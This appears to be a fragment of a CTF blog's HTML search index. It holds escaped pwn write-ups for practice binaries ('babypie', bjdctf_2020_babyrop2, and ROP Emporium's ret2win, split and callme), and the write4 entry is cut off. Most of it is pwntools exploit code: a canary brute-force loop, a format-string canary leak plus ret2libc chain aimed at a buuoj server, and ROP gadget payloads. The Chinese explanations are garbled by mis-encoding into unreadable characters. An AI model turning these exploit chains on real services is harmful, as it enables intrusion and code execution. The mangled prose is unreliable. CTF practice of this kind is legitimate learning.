list1=[b&amp;quot;\x00&amp;quot;,b&amp;quot;\x01&amp;quot;,b&amp;quot;\x02&amp;quot;,b&amp;quot;\x03&amp;quot;,b&amp;quot;\x04&amp;quot;,b&amp;quot;\x05&amp;quot;,b&amp;quot;\x06&amp;quot;,b&amp;quot;\x07&amp;quot;,b&amp;quot;\x08&amp;quot;,b&amp;quot;\x09&amp;quot;,b&amp;quot;\x0a&amp;quot;,b&amp;quot;\x0b&amp;quot;,b&amp;quot;\x0c&amp;quot;,b&amp;quot;\x0d&amp;quot;,b&amp;quot;\x0e&amp;quot;,b&amp;quot;\x0f&amp;quot;,b&amp;quot;\x10&amp;quot;,b&amp;quot;\x11&amp;quot;,b&amp;quot;\x12&amp;quot;,b&amp;quot;\x13&amp;quot;,b&amp;quot;\x14&amp;quot;,b&amp;quot;\x15&amp;quot;,b&amp;quot;\x16&amp;quot;,b&amp;quot;\x17&amp;quot;,b&amp;quot;\x18&amp;quot;,b&amp;quot;\x19&amp;quot;,b&amp;quot;\x1a&amp;quot;,b&amp;quot;\x1b&amp;quot;,b&amp;quot;\x1c&amp;quot;,b&amp;quot;\x1d&amp;quot;,b&amp;quot;\x1e&amp;quot;,b&amp;quot;\x1f&amp;quot;,b&amp;quot;\x20&amp;quot;,b&amp;quot;\x21&amp;quot;,b&amp;quot;\x22&amp;quot;,b&amp;quot;\x23&amp;quot;,b&amp;quot;\x24&amp;quot;,b&amp;quot;\x25&amp;quot;,b&amp;quot;\x26&amp;quot;,b&amp;quot;\x27&amp;quot;,b&amp;quot;\x28&amp;quot;,b&amp;quot;\x29&amp;quot;,b&amp;quot;\x2a&amp;quot;,b&amp;quot;\x2b&amp;quot;,b&amp;quot;\x2c&amp;quot;,b&amp;quot;\x2d&amp;quot;,b&amp;quot;\x2e&amp;quot;,b&amp;quot;\x2f&amp;quot;,b&amp;quot;\x30&amp;quot;,b&amp;quot;\x31&amp;quot;,b&amp;quot;\x32&amp;quot;,b&amp;quot;\x33&amp;quot;,b&amp;quot;\x34&amp;quot;,b&amp;quot;\x35&amp;quot;,b&amp;quot;\x36&amp;quot;,b&amp;quot;\x37&amp;quot;,b&amp;quot;\x38&amp;quot;,b&amp;quot;\x39&amp;quot;,b&amp;quot;\x3a&amp;quot;,b&amp;quot;\x3b&amp;quot;,b&amp;quot;\x3c&amp;quot;,b&amp;quot;\x3d&amp;quot;,b&amp;quot;\x3e&amp;quot;,b&amp;quot;\x3f&amp;quot;,b&amp;quot;\x40&amp;quot;,b&amp;quot;\x41&amp;quot;,b&amp;quot;\x42&amp;quot;,b&amp;quot;\x43&amp;quot;,b&amp;quot;\x44&amp;quot;,b&amp;quot;\x45&amp;quot;,b&amp;quot;\x46&amp;quot;,b&amp;quot;\x47&amp;quot;,b&amp;quot;\x48&amp;quot;,b&amp;quot;\x49&amp;quot;,b&amp;quot;\x4a&amp;quot;,b&amp;quot;\x4b&amp;quot;,b&amp;quot;\x4c&amp;quot;,b&amp;quot;\x4d&amp;quot;,b&amp;quot;\x4e&amp;quot;,b&amp;quot;\x4f&amp;quot;,b&amp;quot;\x50&amp;quot;,b&amp;quot;\x51&amp;quot;,b&amp;quot;\x52&amp;quot;,b&amp;quot;\x53&amp;quot;,b&amp;quot;\x54&amp;quot;,b&amp;quot;\x55&amp;quot;,b&amp;quot;\x56&amp;quot;,b&amp;quot;\x57&amp;quot;,b&amp;quot;\x58&amp;quot;,b&amp;quot;\x59&amp;quot;,b&amp;quot;\x5a&amp;quot;,b&amp;quot;\x5b&amp;quot;,b&amp;quot;\x5c&amp;quot;,b&amp;quot;\x5d&amp;quot;,b&amp;quot;\x5e&amp;quot;,b&amp;quot;\x5f&amp;quot;,b&amp;quot;\x60&amp;quot;,b&amp;quot;\x61&amp;quot;,b&amp;quot;\x62&amp;quot;,b&amp;quot;\x63&amp;quot;,b&amp;quot;\x64&amp;quot;,b&amp;quot;\x65&amp;quot;,b&amp;quot;\x66&amp;quot;,b&amp;quot;\x67&amp;quot;,b&amp;quot;\x68&amp;quot;,b&amp;quot;\x69&amp;quot;,b&amp;quot;\x6a&amp;quot;,b&amp;quot;\x6b&amp;quot;,b&amp;quot;\x6c&amp;quot;,b&amp;quot;\x6d&amp;quot;,b&amp;quot;\x6e&amp;quot;,b&amp;quot;\x6f&amp;quot;,b&amp;quot;\x70&amp;quot;,b&amp;quot;\x71&amp;quot;,b&amp;quot;\x72&amp;quot;,b&amp;quot;\x73&amp;quot;,b&amp;quot;\x74&amp;quot;,b&amp;quot;\x75&amp;quot;,b&amp;quot;\x76&amp;quot;,b&amp;quot;\x77&amp;quot;,b&amp;quot;\x78&amp;quot;,b&amp;quot;\x79&amp;quot;,b&amp;quot;\x7a&amp;quot;,b&amp;quot;\x7b&amp;quot;,b&amp;quot;\x7c&amp;quot;,b&amp;quot;\x7d&amp;quot;,b&amp;quot;\x7e&amp;quot;,b&amp;quot;\x7f&amp;quot;,b&amp;quot;\x80&amp;quot;,b&amp;quot;\x81&amp;quot;,b&amp;quot;\x82&amp;quot;,b&amp;quot;\x83&amp;quot;,b&amp;quot;\x84&amp;quot;,b&amp;quot;\x85&amp;quot;,b&amp;quot;\x86&amp;quot;,b&amp;quot;\x87&amp;quot;,b&amp;quot;\x88&amp;quot;,b&amp;quot;\x89&amp;quot;,b&amp;quot;\x8a&amp;quot;,b&amp;quot;\x8b&amp;quot;,b&amp;quot;\x8c&amp;quot;,b&amp;quot;\x8d&amp;quot;,b&amp;quot;\x8e&amp;quot;,b&amp;quot;\x8f&amp;quot;,b&amp;quot;\x90&amp;quot;,b&amp;quot;\x91&amp;quot;,b&amp;quot;\x92&amp;quot;,b&amp;quot;\x93&amp;quot;,b&amp;quot;\x94&amp;quot;,b&amp;quot;\x95&amp;quot;,b&amp;quot;\x96&amp;quot;,b&amp;quot;\x97&amp;quot;,b&amp;quot;\x98&amp;quot;,b&amp;quot;\x99&amp;quot;,b&amp;quot;\x9a&amp;quot;,b&amp;quot;\x9b&amp;quot;,b&amp;quot;\x9c&amp;quot;,b&amp;quot;\x9d&amp;quot;,b&amp;quot;\x9e&amp;quot;,b&amp;quot;\x9f&amp;quot;,b&amp;quot;\xa0&amp;quot;,b&amp;quot;\xa1&amp;quot;,b&amp;quot;\xa2&amp;quot;,b&amp;quot;\xa3&amp;quot;,b&amp;quot;\xa4&amp;quot;,b&amp;quot;\xa5&amp;quot;,b&amp;quot;\xa6&amp;quot;,b&amp;quot;\xa7&amp;quot;,b&amp;quot;\xa8&amp;quot;,b&amp;quot;\xa9&amp;quot;,b&amp;quot;\xaa&amp;quot;,b&amp;quot;\xab&amp;quot;,b&amp;quot;\xac&amp;quot;,b&amp;quot;\xad&amp;quot;,b&amp;quot;\xae&amp;quot;,b&amp;quot;\xaf&amp;quot;,b&amp;quot;\xb0&amp;quot;,b&amp;quot;\xb1&amp;quot;,b&amp;quot;\xb2&amp;quot;,b&amp;quot;\xb3&amp;quot;,b&amp;quot;\xb4&amp;quot;,b&amp;quot;\xb5&amp;quot;,b&amp;quot;\xb6&amp;quot;,b&amp;quot;\xb7&amp;quot;,b&amp;quot;\xb8&amp;quot;,b&amp;quot;\xb9&amp;quot;,b&amp;quot;\xba&amp;quot;,b&amp;quot;\xbb&amp;quot;,b&amp;quot;\xbc&amp;quot;,b&amp;quot;\xbd&amp;quot;,b&amp;quot;\xbe&amp;quot;,b&amp;quot;\xbf&amp;quot;,b&amp;quot;\xc0&amp;quot;,b&amp;quot;\xc1&amp;quot;,b&amp;quot;\xc2&amp;quot;,b&amp;quot;\xc3&amp;quot;,b&amp;quot;\xc4&amp;quot;,b&amp;quot;\xc5&amp;quot;,b&amp;quot;\xc6&amp;quot;,b&amp;quot;\xc7&amp;quot;,b&amp;quot;\xc8&amp;quot;,b&amp;quot;\xc9&amp;quot;,b&amp;quot;\xca&amp;quot;,b&amp;quot;\xcb&amp;quot;,b&amp;quot;\xcc&amp;quot;,b&amp;quot;\xcd&amp;quot;,b&amp;quot;\xce&amp;quot;,b&amp;quot;\xcf&amp;quot;,b&amp;quot;\xd0&amp;quot;,b&amp;quot;\xd1&amp;quot;,b&amp;quot;\xd2&amp;quot;,b&amp;quot;\xd3&amp;quot;,b&amp;quot;\xd4&amp;quot;,b&amp;quot;\xd5&amp;quot;,b&amp;quot;\xd6&amp;quot;,b&amp;quot;\xd7&amp;quot;,b&amp;quot;\xd8&amp;quot;,b&amp;quot;\xd9&amp;quot;,b&amp;quot;\xda&amp;quot;,b&amp;quot;\xdb&amp;quot;,b&amp;quot;\xdc&amp;quot;,b&amp;quot;\xdd&amp;quot;,b&amp;quot;\xde&amp;quot;,b&amp;quot;\xdf&amp;quot;,b&amp;quot;\xe0&amp;quot;,b&amp;quot;\xe1&amp;quot;,b&amp;quot;\xe2&amp;quot;,b&amp;quot;\xe3&amp;quot;,b&amp;quot;\xe4&amp;quot;,b&amp;quot;\xe5&amp;quot;,b&amp;quot;\xe6&amp;quot;,b&amp;quot;\xe7&amp;quot;,b&amp;quot;\xe8&amp;quot;,b&amp;quot;\xe9&amp;quot;,b&amp;quot;\xea&amp;quot;,b&amp;quot;\xeb&amp;quot;,b&amp;quot;\xec&amp;quot;,b&amp;quot;\xed&amp;quot;,b&amp;quot;\xee&amp;quot;,b&amp;quot;\xef&amp;quot;,b&amp;quot;\xf0&amp;quot;,b&amp;quot;\xf1&amp;quot;,b&amp;quot;\xf2&amp;quot;,b&amp;quot;\xf3&amp;quot;,b&amp;quot;\xf4&amp;quot;,b&amp;quot;\xf5&amp;quot;,b&amp;quot;\xf6&amp;quot;,b&amp;quot;\xf7&amp;quot;,b&amp;quot;\xf8&amp;quot;,b&amp;quot;\xf9&amp;quot;,b&amp;quot;\xfa&amp;quot;,b&amp;quot;\xfb&amp;quot;,b&amp;quot;\xfc&amp;quot;,b&amp;quot;\xfd&amp;quot;,b&amp;quot;\xfe&amp;quot;,b&amp;quot;\xff&amp;quot;]

num=0

while True:
    try:
        io=process(&amp;quot;./babypie&amp;quot;)
        # io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26395)

        # gdb.attach(io)
        # pause()

        io.recvuntil(&amp;quot;Name:\n&amp;quot;)
        payload=b&amp;quot;a&amp;quot;*0x28
        io.sendline(payload)
        io.recvuntil(b&amp;quot;\n&amp;quot;)
        # io.recvuntil(b&amp;quot;:\n&amp;quot;)
        canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
        print(&amp;quot;canary  &amp;quot;+hex(canary))

        io.recvuntil(b&amp;quot;\n&amp;quot;)
        payload=cyclic(0x28)+p64(canary)+p64(0)+list1[num]
        num+=1
        io.sendline(payload)


        io.interactive()
    except :
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">linkctf_2018.7_babypie wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9myo-1kzB/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1675758245230.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êú¨È¢ò64‰ΩçÂºÄÂêØnxÂíåcanary‰øùÊä§&lt;br&gt;
stringsÈáåÈù¢Âπ∂Êú™ÊâæÂà∞&lt;code&gt;system&lt;/code&gt;ÊàñËÄÖ&lt;code&gt;/bin/sh&lt;/code&gt;Á≠âÁ≠âÔºåËÄåÂä†‰∏äinitÂáΩÊï∞‰∏≠ÁöÑÊèêÁ§∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758439196.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•‰ªéret2libcÊñπÂêëÂÖ•ÊâãÔºåËÄå&lt;code&gt;gift&lt;/code&gt;ÂáΩÊï∞‰∏≠Â≠òÂú®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåÂèØ‰ª•Âà©Áî®Ëøô‰∏ÄÁÇπÂ∞ÜcanaryÊâìÂç∞Âá∫Êù•&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758508883.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
È¶ñÂÖàÁ°ÆÂÆöcanaryË∑ùÁ¶ªbuf‰ΩçÁΩÆ‰∏∫0x20-0x8=0x18 #padding&lt;br&gt;
canaryÂÄº‰πüÂú®&lt;code&gt;rbp-8&lt;/code&gt;Â§Ñ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758691630.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∫éÊòØpwndbgÈáåÈù¢Âú®printfÂ§Ñ‰∏ãÊñ≠ÁÇπÔºå‰ΩøÁî®pwngdbËá™Â∏¶fmtargÊµãÁÆóÂÅèÁßªÈáè&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758635253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êé•ÁùÄËé∑ÂèñcanaryÂÄºÔºõ&lt;br&gt;
Áî±‰∫éÈ¢òÁõÆÊú™ÁªôÂá∫libcÁâàÊú¨ÔºåÊâÄ‰ª•ÈúÄË¶ÅËøûÊé•ËøúÁ´ØËé∑Âèñ&lt;br&gt;
ÂèØ‰ª•‰ΩøÁî®putsÊù•ÊâìÂç∞leak_addr&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758875479.png&#34; alt=&#34;ËøôÊòØreadÂáΩÊï∞&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèñÊú´‰∏â‰ΩçÊîæÂÖ•libc databaseÂØªÊâæ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675758972241.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰πãÂêéÂú®glibc-all-in-one‰∏≠ÂØªÊâæÂØπÂ∫îÁâàÊú¨ld.soÊñá‰ª∂ÔºåÂÜçÂà©Áî®patchelfÊõ¥Êç¢(ÂèØ‰ª•ÁúÅÁï•)&lt;br&gt;
Ââ©‰∏ãÁöÑÂ∞±ÊòØÂü∫Êú¨ret2libcÊìç‰Ωú‰∫Ü&lt;br&gt;
expÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./bjdctf_2020_babyrop2&amp;quot;)
elf=ELF(&amp;quot;./bjdctf_2020_babyrop2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26687)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
read_got=elf.got[b&amp;quot;read&amp;quot;]
pop_rdi_ret=0x400993


payload=b&amp;quot;%7$p&amp;quot;
io.recvuntil(b&amp;quot;u!\n&amp;quot;)
io.sendline(payload)
canary=int(io.recv(18),16)
print(&amp;quot;canary  &amp;quot;+hex(canary))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[b&amp;quot;_start&amp;quot;])
io.recvuntil(b&amp;quot;!\n&amp;quot;)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr  &amp;quot;+hex(leak_addr))
base_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
bin_addr=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)
io.recvuntil(b&amp;quot;u!\n&amp;quot;)
io.sendline(b&amp;quot;aa&amp;quot;)
io.recvuntil(b&amp;quot;!\n&amp;quot;)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400763 : mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x0000000000400762 : pop rbp ; mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400700 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005f9 : ret

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">bjdctf_2020_babyrop2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/p748X9SdF/"" data-c="
          &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ret2win&lt;/strong&gt;&lt;br&gt;
checksec‰∏Ä‰∏ã&lt;img src=&#34;https://oraclepi.tech/post-images/1672434958813.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbË∞ÉËØï‰∏Ä‰∏ãÊµãÁÆóÊ∫¢Âá∫ÈïøÂ∫¶&lt;img src=&#34;https://oraclepi.tech/post-images/1672435551271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∏¢ËøõidaÂèëÁé∞ret2winÂáΩÊï∞&lt;img src=&#34;https://oraclepi.tech/post-images/1672435377820.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁºñÂÜôexpÂç≥ÂèØÊâìÈÄöÂæóÂà∞ROPE{a_placeholder_32byte_flag!}Ôºö&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

io=process(&#39;./ret2win&#39;)
payload=cyclic(0x28)+p64(0x400756)
io.recv()
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;split&lt;/strong&gt;&lt;br&gt;
checksec‰∏é‰∏äÈ¢òÂêåÔºå64‰ΩçÂ∞èÁ´ØÂ∫èÔºõ&lt;br&gt;
gdbÊµãÂá∫Ê∫¢Âá∫ÈïøÂ∫¶‰∏∫0x20+0x8&lt;img src=&#34;https://oraclepi.tech/post-images/1672595479702.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êú¨È¢òÊó†Áõ¥Êé•ÂèØÂà©Áî®ÂáΩÊï∞ÔºåËÄÉËôëÊûÑÈÄ†ÔºåÁî±‰∫éÂ≠òÂú®&lt;code&gt;system()&lt;/code&gt;ÂáΩÊï∞ÔºåÊâÄ‰ª•Âè™ÈúÄË¶Å&lt;code&gt;/bin/cat flag.txt  &lt;/code&gt;‰Ωú‰∏∫ÂèÇÊï∞‰º†ÂÖ•ÂáΩÊï∞ÔºåÊú¨È¢ò‰∏∫64‰ΩçÁ®ãÂ∫èÔºåÂàôÈúÄËÄÉËôë64‰Ωç‰º†ÂèÇÈóÆÈ¢òÔºåx64‰∏≠ÁöÑÂâçÂÖ≠‰∏™ÂèÇÊï∞‰æùÊ¨°‰øùÂ≠òÂú®RDIÔºåRSIÔºåRDXÔºåRCXÔºåR8Âíå R9‰∏≠ÔºåÂàôÈúÄË¶Å&lt;code&gt;pop rdi ; ret;&lt;/code&gt;&lt;br&gt;
‰ΩøÁî®&lt;code&gt;ROPgadget --binary split --only &amp;quot;pop|ret&amp;quot;&lt;/code&gt;Êü•ÊâæÊâÄÈúÄgadgets&lt;img src=&#34;https://oraclepi.tech/post-images/1672595935548.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁºñÂÜôexpÂç≥ÂèØÊâìÈÄöÂæóÂà∞ROPE{a_placeholder_32byte_flag!}Ôºö&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

elf=ELF(&#39;./split&#39;)
io=process(&#39;./split&#39;)
bin_addr=next(elf.search(b&#39;/bin/cat flag.txt&#39;))
sys_addr=elf.plt[&amp;quot;system&amp;quot;]
rdi_addr=0x4007c3
payload=cyclic(0x28)+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.recv()
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;callme&lt;/strong&gt;&lt;br&gt;
ËøôÈÅìÈ¢ò‰øùÊä§Êé™ÊñΩÂêå‰∏äÔºå‰ΩÜÊòØÊ†πÊçÆËøôÈÅìÈ¢òÁöÑÊ≥®ÊÑè‰∫ãÈ°πÈúÄË¶ÅÊåâÈ°∫Â∫èÂàÜÂà´Ë∞ÉÁî®3‰∏™ÂáΩÊï∞Ôºå‰∏îÈúÄË¶ÅÂ°´ÂÖ•ÊåáÂÆöÂèÇÊï∞&lt;img src=&#34;https://oraclepi.tech/post-images/1673205618701.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂàôÊ†πÊçÆ64‰ΩçÁ®ãÂ∫è‰º†ÂèÇÔºåÂâçÂÖ≠‰∏™ÂèÇÊï∞ÊòØÊåâ‰ªéÂ∑¶Âà∞Âè≥È°∫Â∫è‰º†ÂÖ•ÂØÑÂ≠òÂô®ÔºåÂêéÈù¢ÁöÑÊåâÁÖß‰ªéÂè≥Âà∞Â∑¶ÁöÑÈ°∫Â∫èÂéãÂÖ•Ê†à‰∏≠ÔºåÂàôÊ≠§È¢ò‰º†ÂèÇÊó∂&lt;code&gt;call_xxx&lt;/code&gt;ÂáΩÊï∞‰ªéÂ∑¶Âà∞Âè≥Âç≥ÂèØ&lt;br&gt;
ÊµãÂá∫Ê∫¢Âá∫ÈïøÂ∫¶0x28ÔºåÂêåÁêÜÂØªÊâægadgetÔºåÂàÜÂà´ÊòØ&lt;code&gt;pop_rdi_ret&lt;/code&gt;Âíå&lt;code&gt;pop_rsi_rdx_ret&lt;/code&gt;ÔºåÁÑ∂ÂêéÂéãÂÖ•ÂØπÂ∫î3‰∏™ÂèÇÊï∞&lt;img src=&#34;https://oraclepi.tech/post-images/1673205862488.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁºñÂÜôexpÊúÄÂºÄÂßãÂá∫Èîô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673206062831.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ë∞ÉËØï‰∏ÄÊ≥¢ÂèëÁé∞ÊòØexp&lt;code&gt;flat()&lt;/code&gt;ÈáåÈù¢ÁöÑÂèÇÊï∞0x***ÂâçÂä†‰∫Ü&lt;code&gt;b&#39;&#39;&lt;/code&gt;‰ΩøÁî®‰∫ÜÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢ÔºåËÄåflatÊú¨Ë∫´ÊúÄÂêéÂ∞±ÊòØËΩ¨Êç¢‰∏∫bytesÔºåÂàô‰∏çÈúÄË¶ÅÂä†&lt;code&gt;b&#39;&#39;&lt;/code&gt;ÔºåÂÆåÊï¥expÂ¶Ç‰∏ã&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

context.log_level = &#39;debug&#39;
context.arch=&#39;amd64&#39;
context.os=&#39;linux&#39;
context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

elf=ELF(&amp;quot;./callme&amp;quot;)
io=process(&amp;quot;./callme&amp;quot;)
rdi_ret_addr=0x4009a3
rsi_rdx_ret_addr=0x40093d
call1_addr=elf.symbols[&amp;quot;callme_one&amp;quot;]
call2_addr=elf.symbols[&amp;quot;callme_two&amp;quot;]
call3_addr=elf.symbols[&amp;quot;callme_three&amp;quot;]
#1
payload=cyclic(0x28)+flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call1_addr)
#2
payload += flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call2_addr)
#3
payload += flat(rdi_ret_addr,0xdeadbeefdeadbeef,rsi_rdx_ret_addr,0xcafebabecafebabe,0xd00df00dd00df00d,call3_addr)
#Êú¨Âú∞ÁéØÂ¢ÉÈóÆÈ¢òÈúÄÂä†‰∏äret_addr
# ret_addr=0x4006be
# payload += p64(ret_addr) //Êõ¥Êç¢ÁéØÂ¢ÉÂêé‰∏çÈúÄË¶ÅÂä†‰∏äret_addr‰∫Ü
io.recvuntil(b&#39;&amp;gt;&#39;)
io.sendline(payload)
# gdb.attach(io)
# pause()
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;write4&lt;/strong&gt;&lt;br&gt;
Ê≠§È¢ò‰øùÊä§Êé™ÊñΩÂêå‰∏äÔºåÂú®idaÈáåÈù¢ÂèëÁé∞Ê≤°ÊúâÂ∏∏ËßÅÁöÑ&lt;code&gt;system()&lt;/code&gt;Âíå&lt;code&gt;/bin/sh&lt;/code&gt;Ôºå‰ΩÜÊòØÂç¥Êúâ‰∏Ä‰∏™&lt;code&gt;printf_file&lt;/code&gt;ÂáΩÊï∞ÔºåÊú¨È¢òÊèê‰æõÁöÑlibc.soÊñá‰ª∂‰∏≠Âê´ÊúâsystemÂáΩÊï∞Ôºå‰ΩÜÈúÄË¶ÅËá™Ë°åÊûÑÂª∫ÂèÇÊï∞ÔºåvmmapÊü•ÁúãÂèØÂÜôÊÆµ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673291428782.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âú®ida‰∏≠‰πüÂèØ‰ª•ÊâæÂà∞.bssÊÆµÔºåÂØπÂ∫îvmmap‰∏≠Âú∞ÂùÄÂèØÁü•Ê≠§Â§ÑÂèØÂÜô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673291508659.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÈÇ£‰πàÂêëËØ•ÊÆµÂÜôÂÖ•ÈúÄË¶Ågadgets,ROPgadgetÊâæ‰∏Ä‰∏ã&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;# Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400692 : pop r15 ; ret
# 0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x0000000000400693 : pop rdi ; ret
# 0x0000000000400691 : pop rsi ; pop r15 ; ret
# 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004e6 : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèëÁé∞ÂèØÁî®ÁöÑÔºår14Â≠òbssÊÆµÂú∞ÂùÄÔºår15Â≠ò&amp;quot;flag.txt&amp;quot;Â≠óÁ¨¶‰∏≤ÔºåÊé•ÁùÄÂ∞Ür15ÂÜÖÂÆπÂÜôÂÖ•r14ÊåáÂêëÁöÑÂú∞ÂùÄ&lt;br&gt;
&lt;code&gt;pop r14 ; pop r15 ; ret&lt;/code&gt;&lt;br&gt;
&lt;code&gt;mov qword ptr [r14], r15 ; ret&lt;/code&gt;&lt;br&gt;
Êé•ÁùÄÊåâ&lt;strong&gt;È°∫Â∫è&lt;/strong&gt;ÁªÑË£Ögadgets&lt;br&gt;
ÂÖ∂‰∏≠ËØ¶ÁªÜË∞ÉÁî®Â¶ÇÂõæ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673347270739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏Ä‰∏™retÂ∞Üpop_r14_r15ÔºåÊ≠§Êó∂Ê†àÈ°∂Êõ¥Êñ∞‰ΩçbssÊÆµÂú∞ÂùÄ&lt;br&gt;
ÂàôÁºñÂÜôexpÂ¶Ç‰∏ã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
